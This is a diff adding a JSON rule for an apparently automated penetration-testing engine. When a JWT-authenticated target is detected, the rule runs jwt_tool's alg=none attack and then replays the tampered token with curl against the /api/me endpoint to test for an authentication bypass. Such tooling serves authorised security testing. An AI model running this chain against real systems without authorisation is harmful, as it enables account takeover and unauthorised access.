@@ -1,0 +1,32 @@
+{
+  "id": "R-CHAIN-JWT-ALG-NONE",
+  "name": "JWT→alg none→bypass",
+  "category": "chain",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "auth.jwt"
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "JWT alg=none 绕过",
+    "actions": [
+      {
+        "tool": "jwt_tool",
+        "cmd": "jwt_tool {token} -X a"
+      },
+      {
+        "tool": "curl",
+        "cmd": "curl -H 'Authorization: Bearer {tampered}' {url}/api/me"
+      }
+    ],
+    "on_hit_class": "auth.bypass",
+    "priority": {
+      "impact": 0.8,
+      "cost": 0.2
+    }
+  }
+}
